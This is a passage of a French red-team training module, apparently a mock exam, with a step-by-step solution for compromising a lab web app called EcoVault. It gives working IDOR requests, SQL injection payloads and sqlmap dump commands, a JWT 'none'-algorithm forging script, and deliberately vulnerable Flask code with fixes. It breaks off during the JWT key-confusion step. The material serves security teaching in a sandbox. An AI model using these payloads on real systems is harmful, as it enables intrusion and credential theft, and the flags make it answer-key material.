# Module 5 — Scénario Autonome : Compromission Complète EcoVault

**Niveau** : M2 (Red Team) — Examen Blanc  
**Durée** : 45 minutes (chrono)  
**Lab** : `http://ecovault.local` (ou `http://localhost:8080`)
```bash
# Ajouter à /etc/hosts pour résoudre ecovault.local :
echo "127.0.0.1 ecovault.local" | sudo tee -a /etc/hosts
```
**Compte fourni** : `user@ecovault.com` / `User2026!`  
**Type de test** : Boîte grise  
**Tags MITRE ATT&CK** : T1548, T1190, T1078, T1059.003, T1021

---

## Table des matières

1. [Briefing de mission](#1-briefing-de-mission)
2. [Règles de l'exercice (ROE)](#2-règles-de-lexercice-roe)
3. [Objectifs — Flags](#3-objectifs--flags)
4. [Solution pas à pas détaillée](#4-solution-pas-à-pas-détaillée)
   - [Flag 1 — IDOR (T1548)](#41-flag-1--idor-t1548)
   - [Flag 2 — SQLi (T1190)](#42-flag-2--sqli-t1190)
   - [Flag 3 — Auth Bypass JWT (T1078)](#43-flag-3--auth-bypass-jwt-t1078)
   - [Flag 4 — SSTI → RCE (T1190 → T1059.003)](#44-flag-4--ssti--rce-t1190--t1059003)
   - [Flag 5 — Pivoting (T1021)](#45-flag-5-bonus--pivoting-t1021)
5. [Template de documentation ATT&CK](#5-template-de-documentation-attck)
6. [Annexes : Corrections et explications](#6-annexes--corrections-et-explications)

---

## 1. Briefing de mission

### 1.1 Contexte

**EcoVault** est une startup fintech française en pleine croissance qui propose une solution de coffre-fort numérique pour particuliers et entreprises. Leur plateforme SaaS permet de stocker, partager et signer électroniquement des documents sensibles (contrats, relevés bancaires, pièces d'identité).

Suite à une **fuite de données présumée** signalée par un chercheur en sécurité indépendant, la direction d'EcoVault mandate votre équipe Red Team pour :

1. **Valider ou infirmer** la présence de vulnérabilités exploitables
2. **Mesurer l'impact** maximal d'une compromission
3. **Produire un rapport de conformité NIS2** avec cartographie MITRE ATT&CK

### 1.2 Type de test

| Élément | Valeur |
|---------|--------|
| Type | **Boîte grise** — un compte standard vous est fourni |
| Périmètre | Application web + infrastructure interne |
| Approche | Synthèse des modules M1 (MITRE), M2 (Injections), M3 (Auth) |
| Contrainte | **45 minutes** — travail individuel |

### 1.3 Compte fourni

```
Email    : user@ecovault.com
Password : User2026!
```

Ce compte a le rôle `user` (pas `admin`). Toute l'attaque part de ce point d'entrée.

### 1.4 Cible

```
URL principale  : http://ecovault.local (alias http://localhost:8080)
Réseau interne  : 10.0.0.0/24
```

---

## 2. Règles de l'exercice (ROE)

### 2.1 Périmètre autorisé

| Élément | Autorisé |
|---------|----------|
| **Réseau** | Tout le sous-réseau `10.0.0.0/24` |
| **Services** | HTTP (80, 8080, 8081), Base de données (3306, 5432), SMTP (25) |
| **Outils** | Tout outil autorisé (sqlmap, Burp, jwt_tool, chisel, nmap, curl, python) |
| **Exploitation** | RCE, reverse shell, exfiltration |
| **Pivoting** | Mouvement latéral vers `10.0.0.10` |

### 2.2 Périmètre interdit

| Action | Interdit ? | Raison |
|--------|-----------|--------|
| **DoS / DDoS** | ❌ Interdit | Impact sur les autres étudiants |
| **Destruction de données** | ❌ Interdit | DROP TABLE, rm -rf, formatage |
| **Modification permanente** | ❌ Interdit | Altération de la base ou des fichiers du lab |
| **Ingénierie sociale** | ❌ Interdit | Hors scope |
| **Attaque physique** | ❌ Interdit | Hors scope |

### 2.3 Documentation obligatoire

Chaque vulnérabilité découverte doit être **documentée** avec :

```
Flag X : [description courte]
  Technique  : [nom de la technique]
  ATT&CK ID  : TXXXX(.XXX)
  Endpoint   : [URL ou endpoint]
  Payload    : [payload utilisé]
  Impact     : [critique / élevé / moyen / faible]
  Remédiation: [correctif proposé]
```

### 2.4 Conformité NIS2

Conformément à l'**Article 21** de la directive NIS2 (UE 2022/2555), le rapport de test produit constitue un **livrable de conformité** qui démontre :

- La couverture des risques par technique ATT&CK
- L'identification des gaps de sécurité
- Les recommandations correctives priorisées
- La traçabilité complète des tests effectués

---

## 3. Objectifs — Flags

### 3.1 Tableau récapitulatif

| # | Flag | Technique | T ATT&CK | Difficulté | Points |
|:-:|------|-----------|----------|:----------:|:-----:|
| 1 | Lire le profil admin | IDOR | T1548 | ⭐ | 20 |
| 2 | Extraire la table `users` | SQLi | T1190 | ⭐⭐ | 25 |
| 3 | Devenir administrateur | Auth Bypass JWT | T1078 | ⭐⭐⭐ | 25 |
| 4 | Obtenir un shell (RCE) | SSTI → RCE | T1190 → T1059.003 | ⭐⭐⭐⭐ | 30 |
| 5 (B) | Récupérer le fichier interne | Pivoting | T1021 | ⭐⭐⭐⭐⭐ | 20 (bonus) |
| | **Total** | | | | **120** |

### 3.2 Arbre d'attaque global

```
user@ecovault.com
    │
    ├── Flag 1 — IDOR [T1548]
    │   └── GET /api/profile/1 → clé API admin
    │
    ├── Flag 2 — SQLi [T1190]
    │   └── GET /api/transactions?filter= → dump users table
    │
    ├── Flag 3 — JWT Forge [T1078]
    │   └── None algorithm / HMAC-RSA confusion → token admin
    │
    ├── Flag 4 — SSTI → RCE [T1190 → T1059.003]
    │   └── POST /admin/templates → reverse shell
    │
    └── Flag 5 — Pivoting [T1021] (BONUS)
        └── Reverse shell → chisel tunnel → fichier SMTP interne
```

---

## 4. Solution pas à pas détaillée

### 4.1 Flag 1 — IDOR (T1548)

#### 4.1.1 Technique

**Insecure Direct Object Reference (IDOR)** : le endpoint `/api/profile/{id}` expose les profils utilisateur sans vérifier que l'ID demandé correspond à l'utilisateur connecté. En modifiant simplement l'ID dans l'URL, on accède au profil d'autres utilisateurs, y compris l'administrateur.

#### 4.1.2 Tag MITRE ATT&CK

| ID | Nom | Tactique |
|----|-----|----------|
| **T1548** | Abuse Elevation Control Mechanism | Privilege Escalation (TA0004) |

**Description** : L'attaquant contourne le mécanisme de contrôle d'accès en manipulant la référence directe à un objet (ID numérique) pour accéder à une ressource dont il n'est pas autorisé.

#### 4.1.3 Outils nécessaires

- `curl` (CLI) ou Burp Suite (GUI)
- Un cookie de session valide (obtenu via le compte fourni)

#### 4.1.4 Marche à suivre

**Étape 1 — Se connecter à l'application**

```bash
# -c : écrit les cookies reçus dans le fichier (nécessaire pour conserver le JWT)
# -X POST : utilise la méthode HTTP POST pour soumettre le formulaire de login
# -d : envoie les données du formulaire (email et mot de passe du compte fourni)
# -L : suit automatiquement les redirections (le serveur redirige après login réussi)
curl -c /tmp/flag1_cookies.txt -X POST http://ecovault.local/login \
  -d "email=user@ecovault.com&password=User2026!" -L
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `curl` | Outil CLI de transfert de données supportant de nombreux protocoles (HTTP, FTP, etc.) |
| `-c /tmp/flag1_cookies.txt` | Cookie jar : écrit les cookies reçus (dont le JWT) dans le fichier spécifié |
| `-X POST` | Force la méthode HTTP POST pour envoyer le formulaire d'authentification |
| `http://ecovault.local/login` | URL du endpoint d'authentification de l'application EcoVault |
| `-d "email=...&password=..."` | Données du formulaire URL-encodées contenant les identifiants fournis |
| `-L` | Suit les redirections HTTP 3xx (le serveur redirige vers /dashboard après login) |

On obtient un cookie de session qui contient un JWT. Vérifions :

```bash
# Affiche le contenu du fichier de cookies pour vérifier que le JWT a bien été stocké
cat /tmp/flag1_cookies.txt
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `cat` | Affiche le contenu d'un fichier dans le terminal |
| `/tmp/flag1_cookies.txt` | Fichier contenant les cookies HTTP (dont le JWT d'authentification) |

**Étape 2 — Lire son propre profil**

L'utilisateur `user@ecovault.com` a l'ID 2 (l'admin a l'ID 1).

```bash
# -b : utilise le fichier de cookies pour envoyer le JWT dans la requête
# L'ID 2 correspond à l'utilisateur standard user@ecovault.com
curl -b /tmp/flag1_cookies.txt http://ecovault.local/api/profile/2
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `curl` | Outil CLI de transfert de données |
| `-b /tmp/flag1_cookies.txt` | Envoie les cookies du fichier dans la requête HTTP (authentification JWT) |
| `http://ecovault.local/api/profile/2` | Endpoint API qui retourne le profil utilisateur ; `2` est l'ID de l'utilisateur standard |

**Réponse attendue :**

```json
{
    "id": 2,
    "email": "user@ecovault.com",
    "role": "user",
    "api_key": null,
    "created_at": "2026-06-01T08:00:00"
}
```

**Étape 3 — Exploiter l'IDOR pour lire le profil admin**

On change simplement l'ID de `2` à `1` :

```bash
# Exploitation IDOR : on change simplement l'ID de 2 à 1 pour cibler l'administrateur
# Le serveur ne vérifie PAS que l'ID demandé correspond à l'utilisateur connecté
curl -b /tmp/flag1_cookies.txt http://ecovault.local/api/profile/1
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `curl` | Outil CLI de transfert de données |
| `-b /tmp/flag1_cookies.txt` | Envoie le cookie JWT de session (authentification en tant que user) |
| `http://ecovault.local/api/profile/1` | Endpoint vulnérable ; l'ID `1` est celui de l'administrateur — aucune vérification d'appartenance |

**Réponse attendue (Flag 1) :**

```json
{
    "id": 1,
    "email": "admin@ecovault.com",
    "role": "admin",
    "api_key": "flag{idor_admin_key_7e9f2b}",
    "created_at": "2026-06-01T08:00:00"
}
```

**Flag obtenu :** `flag{idor_admin_key_7e9f2b}`

#### 4.1.5 Pourquoi ça marche

Le endpoint `/api/profile/{id}` dans le code de l'application ressemble à ceci :

```python
# ⚠️ Code vulnérable : endpoint qui retourne le profil sans contrôle d'appartenance
@app.route('/api/profile/<int:user_id>')
def api_profile(user_id):
    # Faille 1 : user_id (paramètre URL) n'est JAMAIS comparé à l'ID du JWT
    # Faille 2 : concaténation directe dans la requête SQL (vulnérabilité SQLi)
    user = query_db(f"SELECT * FROM users WHERE id={user_id}", one=True)
    if user:
        return jsonify(user)       # Retourne toutes les colonnes (y compris api_key)
    return jsonify({'error': 'Not found'}), 404
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `@app.route(...)` | Décorateur Flask qui associe une URL à une fonction |
| `<int:user_id>` | Paramètre d'URL typé (entier) capturé depuis le chemin |
| `query_db(...)` | Fonction interne qui exécute une requête SQL et retourne les résultats |
| `f"SELECT ... {user_id}"` | **F-string** : concaténation directe de l'utilisateur dans la requête (SQLi) |
| `jsonify(user)` | Convertit le dictionnaire Python en réponse JSON |

**Deux failles distinctes :**

1. **Absence de vérification d'appartenance** : le code ne compare pas `user_id` (paramètre de l'URL) avec l'ID extrait du JWT de l'utilisateur connecté. Il devrait y avoir un test du type :

   ```python
   # ✅ Vérification d'appartenance qui DEVRAIT être présente
   # Compare l'ID de l'URL (user_id) avec l'ID extrait du JWT (current_user.id)
   if user_id != current_user.id:
       return jsonify({'error': 'Unauthorized'}), 403  # 403 = Forbidden
   ```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `if user_id != current_user.id` | Compare l'ID demandé dans l'URL avec l'ID de l'utilisateur authentifié (via JWT) |
| `return jsonify({'error': 'Unauthorized'}), 403` | Retourne une erreur HTTP 403 Forbidden si les IDs ne correspondent pas |

2. **Requête SQL non paramétrée** : la chaîne SQL est construite par concaténation (`f-string`), ce qui rend le endpoint également vulnérable à l'injection SQL (Flag 2).

#### 4.1.6 Commandes alternatives

Avec **Burp Suite** :

1. Proxy → activer l'interception
2. Naviguer vers `/api/profile/2`
3. Envoyer la requête à Repeater (`Ctrl+R`)
4. Modifier l'URL : `/api/profile/1`
5. Envoyer → observer la réponse

Avec **Python** (script d'énumération) :

```python
#!/usr/bin/env python3
"""
Script d'énumération IDOR — Teste les IDs 1 à 10 sur /api/profile/{id}
Automatise la détection des profils accessibles sans autorisation
"""
import requests

BASE = "http://ecovault.local"
s = requests.Session()                                      # Crée une session persistante (conserve les cookies)
s.post(f"{BASE}/login", data={"email": "user@ecovault.com", "password": "User2026!"})  # Authentification initiale

for uid in range(1, 11):                                    # Boucle sur les IDs 1 à 10
    r = s.get(f"{BASE}/api/profile/{uid}")                  # Requête GET avec l'ID en paramètre
    if r.status_code == 200:                                 # Si la réponse est 200 OK, le profil est accessible
        data = r.json()
        print(f"[+] ID {uid}: {data.get('email')} — role={data.get('role')} — key={data.get('api_key')}")
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `import requests` | Importe la bibliothèque Python pour les requêtes HTTP |
| `requests.Session()` | Crée une session qui conserve les cookies entre les requêtes (comme un navigateur) |
| `s.post(url, data=...)` | Envoie une requête POST avec les données du formulaire d'authentification |
| `for uid in range(1, 11)` | Itère sur les IDs utilisateur de 1 à 10 pour énumérer les profils |
| `s.get(url)` | Envoie une requête GET avec le cookie de session |
| `r.status_code == 200` | Vérifie si la requête a réussi (code HTTP 200 = OK) |
| `r.json()` | Parse la réponse JSON en dictionnaire Python |
| `data.get('api_key')` | Récupère la clé API (non nulle uniquement pour l'admin) |

---

### 4.2 Flag 2 — SQLi (T1190)

#### 4.2.1 Technique

**SQL Injection (SQLi)** sur le paramètre `filter` du endpoint `/api/transactions`. Le paramètre n'est pas assaini et est directement concaténé dans une requête SQL. On utilise un `UNION SELECT` pour fusionner les résultats de la requête légitime avec ceux d'une requête malveillante qui extrait la table `users`.

#### 4.2.2 Tag MITRE ATT&CK

| ID | Nom | Tactique |
|----|-----|----------|
| **T1190** | Exploit Public-Facing Application | Initial Access (TA0001) |

**Description** : L'attaquant exploite une injection SQL dans une application exposée publiquement pour accéder aux données de la base, contourner l'authentification, ou exécuter des commandes.

#### 4.2.3 Outils nécessaires

- `curl` pour les tests manuels
- `sqlmap` (automatisation) — recommandé pour gagner du temps
- Optionnel : script Python pour extraction blind

#### 4.2.4 Marche à suivre

**Étape 1 — Détection de l'injection**

```bash
# -s : mode silencieux (n'affiche pas la barre de progression)
# Le paramètre filter reçoit une guillemet simple ' pour "casser" la requête SQL
# Si le serveur renvoie une erreur SQL ou une réponse vide, il est vulnérable
curl -s "http://ecovault.local/api/transactions?filter=1'"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `curl` | Outil CLI pour effectuer des requêtes HTTP |
| `-s` | Mode silencieux : désactive la barre de progression et les messages d'erreur |
| `?filter=1'` | Paramètre GET contenant une guillemet simple pour fermer la chaîne SQL et provoquer une erreur de syntaxe |
| URL complète | Endpoint /api/transactions qui construit la requête SQL par concaténation du paramètre filter |

**Si vulnérable** : une erreur SQL apparaît dans la réponse, ou la réponse est différente (vide, code 500).

```bash
# time : mesure la durée d'exécution de la commande
# --max-time 10 : limite le temps d'attente à 10 secondes (évite de bloquer)
# SLEEP(3) : fonction MySQL qui suspend l'exécution pendant 3 secondes
# Si la commande prend ~3 secondes, l'injection time-based fonctionne
# %20 = espace, %27 = ' (URL encoding), -- = commentaire SQL
time curl -s --max-time 10 "http://ecovault.local/api/transactions?filter=1'%20OR%20SLEEP(3)%20--%20-"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `time` | Commande Linux qui mesure le temps d'exécution de la commande suivante |
| `--max-time 10` | Limite la requête curl à 10 secondes maximum (timeout) |
| `filter=1'` | Guillemet simple pour fermer la chaîne SQL existante |
| `%20OR%20SLEEP(3)` | `OR SLEEP(3)` en URL-encodé : ajoute une condition qui retarde la réponse de 3s si MySQL |
| `%20--%20-` | Commentaire SQL qui ignore le reste de la requête originale |
| `time curl ...` | L'ensemble mesure le délai de réponse : ~3s → injection time-based confirmée |

Si la requête prend ~3 secondes, le paramètre `filter` est injectable.

**Étape 2 — Déterminer le nombre de colonnes**

```bash
# ORDER BY N : trie les résultats par la colonne N
# Technique : on incrémente N jusqu'à obtenir une erreur
# Le dernier N qui fonctionne = nombre de colonnes dans la table
# %20 = espace (URL encoding), %20ORDER%20BY%20N%20--%20- = " ORDER BY N -- -"
curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%201%20--%20-"  # Trie par colonne 1
curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%202%20--%20-"  # Trie par colonne 2
curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%203%20--%20-"  # Trie par colonne 3
curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%204%20--%20-"  # Trie par colonne 4
curl -s "http://ecovault.local/api/transactions?filter=1'%20ORDER%20BY%205%20--%20-"  # Trie par colonne 5
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `ORDER BY N` | Clause SQL qui trie les résultats par la N-ième colonne ; si N dépasse le nombre réel de colonnes, une erreur est déclenchée |
| `1'` | Guillemet simple pour fermer la chaîne du filtre et injecter du SQL |
| `%20` | URL-encoding de l'espace (indispensable dans une URL) |
| `--%20-` | Commentaire SQL qui ignore le reste de la requête originale (souvent `'` final non fermé) |
| Requêtes séquentielles | On augmente N jusqu'à ce qu'une requête échoue → le dernier N valide est le nombre de colonnes |

**Logique** : on incrémente le nombre de colonnes jusqu'à obtenir une erreur ou une réponse vide. Le dernier nombre valide est le nombre de colonnes. Exemple : si ORDER BY 5 fonctionne mais ORDER BY 6 échoue, il y a 5 colonnes.

**Étape 3 — Injection UNION SELECT manuelle**

```bash
# -1' : ID négatif pour que la 1ère partie du SELECT ne retourne aucun résultat
# UNION SELECT 1,2,3,4,5 : fusionne nos valeurs factices avec le résultat
# Les nombres qui apparaissent dans la réponse sont les colonnes exploitables (affichables)
# -- - : commentaire SQL pour ignorer la fin de la requête originale
curl -s "http://ecovault.local/api/transactions?filter=-1'%20UNION%20SELECT%201,2,3,4,5--%20-"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `UNION SELECT` | Mot-clé SQL qui fusionne les résultats de deux requêtes SELECT distinctes |
| `-1'` | ID négatif : garantit que la première requête ne retourne rien (aucun ID négatif dans la table) |
| `1,2,3,4,5` | Valeurs factices pour chaque colonne ; les numéros qui s'affichent indiquent les positions exploitables |
| `-- -` | Commentaire SQL : supprime le reste de la requête (souvent un `'` non fermé) |
| Logique | Si le chiffre `3` apparaît dans la réponse, la 3e colonne est exploitable pour extraire des données |

On met `-1` au lieu de `1` pour que la première partie de la requête ne retourne aucun résultat, ce qui affiche uniquement notre UNION.

Les numéros qui apparaissent dans la réponse sont les colonnes exploitables.

**Étape 4 — Extraire le nom de la base**

```bash
# DATABASE() : fonction MySQL qui retourne le nom de la base de données courante
# On remplace un des nombres factices (2) par DATABASE() pour l'afficher dans la réponse
curl -s "http://ecovault.local/api/transactions?filter=-1'%20UNION%20SELECT%201,DATABASE(),3,4,5--%20-"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `DATABASE()` | Fonction MySQL qui retourne le nom de la base de données courante |
| `UNION SELECT 1,DATABASE(),3,4,5` | Remplace la colonne 2 par le nom de la base pour l'afficher dans la réponse |
| Résultat attendu | Le nom de la base (`ecovault`) apparaît dans la réponse JSON |

**Réponse** : `ecovault`

**Étape 5 — Extraire les tables**

```bash
# GROUP_CONCAT(table_name) : concatène tous les noms de tables en une seule chaîne
# information_schema.tables : vue système MySQL qui liste toutes les tables
# WHERE table_schema=DATABASE() : filtre uniquement les tables de la base courante
curl -s "http://ecovault.local/api/transactions?filter=-1'%20UNION%20SELECT%201,GROUP_CONCAT(table_name),3,4,5%20FROM%20information_schema.tables%20WHERE%20table_schema=DATABASE()--%20-"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `GROUP_CONCAT(table_name)` | Fonction d'agrégation MySQL qui concatène les valeurs en une chaîne séparée par des virgules |
| `information_schema.tables` | Vue système MySQL contenant les métadonnées de toutes les tables de la base |
| `WHERE table_schema=DATABASE()` | Filtre pour n'obtenir que les tables de la base courante (`ecovault`) |
| Résultat | Liste des tables : `users,transactions,coupons` |

**Réponse** : `users,transactions,coupons`

**Étape 6 — Extraire les colonnes de la table `users`**

```bash
# GROUP_CONCAT(column_name) : concatène tous les noms de colonnes
# information_schema.columns : vue système qui liste toutes les colonnes
# WHERE table_name='users' : filtre sur la table cible
curl -s "http://ecovault.local/api/transactions?filter=-1'%20UNION%20SELECT%201,GROUP_CONCAT(column_name),3,4,5%20FROM%20information_schema.columns%20WHERE%20table_name='users'--%20-"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `information_schema.columns` | Vue système MySQL contenant les métadonnées de toutes les colonnes |
| `WHERE table_name='users'` | Filtre pour n'obtenir que les colonnes de la table `users` |
| `GROUP_CONCAT(column_name)` | Agrège tous les noms de colonnes en une chaîne unique |
| Résultat | Colonnes : `id,email,password,role,api_key,created_at` (la colonne `password` contient les hash/mots de passe) |

**Réponse** : `id,email,password,role,api_key,created_at`

**Étape 7 — Extraire les données (Flag 2)**

```bash
# GROUP_CONCAT(email,':',password) : concatène email + ':' + password pour chaque ligne
# Les colonnes 3,4,5 ne sont pas utilisées mais doivent être présentes pour que UNION fonctionne
# FROM users : extrait les données de la table users complète
curl -s "http://ecovault.local/api/transactions?filter=-1'%20UNION%20SELECT%201,GROUP_CONCAT(email,':',password),3,4,5%20FROM%20users--%20-"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `GROUP_CONCAT(email,':',password)` | Concatène chaque couple email:password séparé par des virgules entre lignes |
| `FROM users` | Source des données : la table utilisateurs complète |
| `1, ..., 3,4,5` | Les colonnes non exploitées doivent contenir des valeurs factices pour respecter le nombre de colonnes |
| Résultat | Liste de tous les comptes utilisateurs avec leurs mots de passe en clair (critique) |

**Réponse attendue (Flag 2) :**

```json
[
    {
        "id": 1,
        "transaction_ref": "admin@ecovault.com:flag{sqli_extract_users_b4d92f},user@ecovault.com:User2026!,alice@ecovault.com:AlicePass123,bob@ecovault.com:BobSecure456",
        "montant": null,
        "devise": null
    }
]
```

**Flag obtenu :** `flag{sqli_extract_users_b4d92f}`

#### 4.2.5 Alternative automatisée avec sqlmap

```bash
# Dump complet de la table users
sqlmap -u "http://ecovault.local/api/transactions?filter=1" \
       --batch \
       --dbms=mysql \
       -D ecovault \
       -T users \
       --dump
```

**Explication des options :**

| Option | Rôle |
|--------|------|
| `-u` | URL cible avec paramètre à tester |
| `--batch` | Mode non-interactif (réponses automatiques) |
| `--dbms=mysql` | Force le type de SGBD (accélère l'analyse) |
| `-D ecovault` | Base de données cible |
| `-T users` | Table cible |
| `--dump` | Extraction complète des données |

**Commande rapide pour tout extraire :**

```bash
# Version compacte de la commande sqlmap ci-dessus
# --dump extrait TOUTES les tables de la base, pas seulement users
sqlmap -u "http://ecovault.local/api/transactions?filter=1" --batch --dbms=mysql --dump
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `sqlmap` | Outil automatisé de détection et d'exploitation d'injections SQL |
| `-u "..."` | URL cible avec le paramètre à tester en injection |
| `--batch` | Mode non-interactif (réponses automatiques "oui" par défaut) |
| `--dbms=mysql` | Force le type de SGBD (accélère l'analyse en évitant les tests inutiles) |
| `--dump` | Extraction complète de toutes les données de toutes les tables de la base |

#### 4.2.6 Pourquoi ça marche

```python
# Code vulnérable (extrait de app.py)
@app.route('/api/transactions')
def api_transactions():
    filter_val = request.args.get('filter', '')
    # ⚠️ Concaténation directe dans la requête SQL
    query = f"SELECT id, transaction_ref, montant, devise FROM transactions WHERE id = '{filter_val}'"
    results = query_db(query)
    return jsonify(results)
```

**Explication :** Le paramètre `filter` est inséré directement dans une chaîne SQL via une f-string Python. Au lieu d'un simple ID numérique, l'attaquant peut injecter des mots-clés SQL (`UNION`, `SELECT`, `FROM`, etc.) qui seront exécutés par le SGBD.

**Correction :** Utiliser une requête paramétrée avec des placeholders :

```python
query = "SELECT id, transaction_ref, montant, devise FROM transactions WHERE id = ?"
results = query_db(query, (filter_val,))
```

---

### 4.3 Flag 3 — Auth Bypass JWT (T1078)

#### 4.3.1 Technique

**Attaque sur JWT (JSON Web Token)** : le serveur utilise un JWT pour l'authentification. L'attaquant analyse le token, identifie la vulnérabilité (algorithme `none`, clé publique exposée, ou `kid` injectable), et forge un token avec le rôle `admin`.

#### 4.3.2 Tag MITRE ATT&CK

| ID | Nom | Tactique |
|----|-----|----------|
| **T1078** | Valid Accounts | Defense Evasion (TA0005) / Persistence (TA0003) |
| **T1134** | Access Token Manipulation | Privilege Escalation (TA0004) |

**Description** : L'attaquant manipule ou forge des jetons d'accès pour usurper l'identité d'un administrateur.

#### 4.3.3 Outils nécessaires

- `jwt.io` (site web) ou `pyjwt` (bibliothèque Python)
- Optionnel : `jwt_tool` (outil CLI)
- `curl` pour tester le token forgé

#### 4.3.4 Marche à suivre

**Étape 1 — Récupérer un JWT légitime**

```bash
# Étape 1 : récupérer un JWT valide en se connectant avec le compte fourni
# -c : stocke les cookies (dont le JWT) dans /tmp/jwt_cookies.txt
curl -c /tmp/jwt_cookies.txt -X POST http://ecovault.local/login \
  -d "email=user@ecovault.com&password=User2026!" -L

# Étape 2 : extraire la valeur du JWT depuis le fichier de cookies
# grep token : cherche la ligne contenant "token"
# awk '{print $NF}' : affiche la dernière colonne (la valeur du cookie)
grep token /tmp/jwt_cookies.txt | awk '{print $NF}'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `curl -c /tmp/jwt_cookies.txt` | Sauvegarde les cookies HTTP (dont le JWT) dans un fichier |
| `-X POST -d "email=...&password=..."` | Authentification par formulaire POST avec les identifiants fournis |
| `-L` | Suit les redirections HTTP après connexion |
| `grep token /tmp/jwt_cookies.txt` | Filtre la ligne contenant "token" dans le fichier de cookies |
| `awk '{print $NF}'` | Extrait la dernière colonne (valeur du cookie JWT) de la ligne filtrée |

**Étape 2 — Analyser le JWT**

Utiliser [jwt.io](https://jwt.io) ou la CLI :

```bash
# Décoder le header et le payload du JWT (format base64url)
# Un JWT est composé de 3 parties séparées par des points : header.payload.signature
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJlbWFpbCI6InVzZXJAZWNvdmF1bHQuY29tIiwicm9sZSI6InVzZXIiLCJraWQiOiJrZXkxIn0.SIGNATURE"

# cut -d. -f1 : extrait la 1ère partie (header) avant le point → décodage base64
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null; echo
# cut -d. -f2 : extrait la 2ème partie (payload) → décodage base64
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null; echo
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `TOKEN="..."` | Variable shell contenant le JWT complet (3 parties séparées par des points) |
| `cut -d. -f1` | Découpe la chaîne avec `.` comme délimiteur et prend le 1er champ (header) |
| `cut -d. -f2` | Prend le 2e champ (payload contenant user_id, email, role) |
| `base64 -d` | Décode du base64 (le JWT utilise du base64url, mais base64 -d fonctionne généralement) |
| `2>/dev/null` | Redirige les erreurs (padding warnings) vers /dev/null pour un affichage propre |
| `; echo` | Ajoute un saut de ligne après le décodage (base64 -d n'ajoute pas de newline) |

**Résultat :**

```json
// Header
{"alg":"HS256","typ":"JWT"}

// Payload
{"user_id":2,"email":"user@ecovault.com","role":"user","kid":"key1"}
```

Notre objectif : modifier le payload pour obtenir `"role":"admin"` et `"user_id":1`.

**Étape 3 — Récupérer la clé publique (pour HMAC/RSA confusion)**

Le lab expose un endpoint qui fournit la configuration JWT :

```bash
# Requête GET vers l'endpoint qui expose la configuration JWT
# Retourne la clé publique RSA et l'algorithme utilisé (RS256)
# Cette information est critique pour l'attaque HMAC/RSA confusion
curl http://ecovault.local/api/jwt-info
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `curl` | Outil CLI pour requêtes HTTP |
| `http://ecovault.local/api/jwt-info` | Endpoint qui expose la configuration JWT : clé publique + algorithme (vulnérabilité : ces infos permettent de forger des tokens) |

**Réponse :**

```json
{
    "public_key": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Z3VS5JJcd0xBXh0w16f\nwLM8m5l8JqQfLpKzPq5n3bR6wX0hYsT8vK3mN1bR4qWxZ5jL9pM2cR7vS8tY0aB1\nnK4xQ6zJ9wV3mD5fH8jL2pR7tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6\nzJ9mV3pR5fH8jL2tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6zJ9mV3pR5\nfH8jL2tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0\nbN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6zJ9mV3pR5fH8jL2tY0bN1kQ4wX6\nzQIDAQAB\n-----END PUBLIC KEY-----",
    "algorithm": "RS256",
    "note": "Clé publique utilisée pour la vérification des signatures JWT"
}
```

**Étape 4 — Forger un token admin**

**Méthode A : None Algorithm**

```python
# Sauvegarder ce script sous forge_jwt_none.py :
#!/usr/bin/env python3
"""
forge_jwt_none.py — Forge un JWT avec l'algorithme 'none'
"""
import base64, json

def b64encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 1, "email": "admin@ecovault.com", "role": "admin"}

token = f"{b64encode(header)}.{b64encode(payload)}."
print(f"Token forgé (none):\n{token}")
```

```bash
# Exécute le script Python pour générer le token JWT avec algorithme 'none'
python3 forge_jwt_none.py
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `python3` | Interpréteur Python 3 qui exécute le script de forge |
| `forge_jwt_none.py` | Script qui génère un JWT avec `alg: none` et rôle admin |

**Méthode B : HMAC/RSA Confusion (recommandée)**

```python
# Sauvegarder ce script sous forge_jwt_confusion.py :
